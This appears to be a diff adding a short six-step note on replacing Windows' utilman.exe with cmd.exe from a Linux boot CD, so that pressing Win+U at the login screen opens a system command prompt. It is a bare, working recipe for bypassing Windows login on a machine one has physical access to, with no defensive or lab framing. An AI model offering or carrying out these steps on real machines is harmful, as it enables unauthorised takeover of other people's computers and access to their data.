@@ -1,0 +1,6 @@
+1- Boot with a linux CD
+2- cd windows\system32
+3- ren utilman.exe utilman.exe.bak
+4- copy cmd.exe utilman.exe
+5- Boot up
+6- Windos+U
